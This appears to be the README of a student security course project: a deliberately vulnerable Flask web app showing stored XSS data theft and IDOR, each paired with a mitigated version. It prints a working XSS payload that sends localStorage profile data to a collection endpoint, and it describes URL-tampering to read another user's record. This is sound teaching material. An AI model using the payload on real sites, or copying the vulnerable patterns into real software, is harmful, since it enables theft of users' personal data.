# CYB3801 Final Project

A deliberately vulnerable web application paired with a mitigated version for
each vulnerability. Built with Flask and SQLite.

**Team:** Bryson Noble, Katherine Kennedy, Neva Ildem

| Member | Vulnerability | Mitigation | Status |
| --- | --- | --- | --- |
| Bryson Noble | Sensitive data stored in `localStorage` + JS-readable cookie, stolen via XSS | Store data server-side in SQLite; opaque `httpOnly` session cookie; escape user input | Done |
| Katherine Kennedy | Insecure Direct Object Reference (IDOR) | Server-side authorization checks | Done |
| Neva Ildem | SQL Injection | Parameterized queries + input validation | TODO |

## Running it

### With Docker

```bash
docker build -t cyb3801 .
docker run --rm -p 5000:5000 cyb3801
```

### Without Docker

```bash
pip install -r requirements.txt
python app.py
```

Then open http://localhost:5000.

Demo logins: `alice / password123` or `bob / hunter2`.

## Bryson Noble — Sensitive data in localStorage & cookies (XSS)

**Vulnerable** (`/bryson/vulnerable`): after logging in, the browser stores the
full sensitive profile (email, SSN, balance, token) in `localStorage` and a
JS-readable cookie. The public comment wall renders comments without escaping,
so a stored-XSS payload such as

```html
<img src=x onerror="fetch('/bryson/steal?d='+encodeURIComponent(localStorage.getItem('profile')))">
```

reads the stored data and exfiltrates it to the attacker's `/bryson/steal`
endpoint (visible in the container logs).

**Mitigated** (`/bryson/mitigated`): the sensitive data stays in SQLite. The
browser only receives an opaque session id in an `httpOnly`, `SameSite=Strict`
cookie, so JavaScript cannot read it, and `localStorage` holds nothing
sensitive. Comments are auto-escaped by Jinja, so the payload renders as inert
text.

## Katherine Kennedy — Insecure Direct Object Reference (IDOR)

**Vulnerable** (`/katherine/vulnerable/profile/<id>`): the server confirms the user is logged in but never checks that the requested record belongs to them. Logged in as `alice` (ID 1), changing the URL to `/katherine/vulnerable/profile/2` returns Bob's email, SSN, and balance.

**Mitigated** (`/katherine/mitigated/profile/<id>`): a server-side authorization check compares the ID in the URL to the user ID stored in the server-side session. A mismatch returns `403 Forbidden` before any other user's data is loaded.

Try both versions side-by-side at `/katherine`.

## For teammates

Add your routes in the clearly marked sections at the bottom of `app.py` and
drop any templates in `templates/`. The SQLite database lives in the directory
named by `BURPLAB_STATE` (`/state` in Docker).
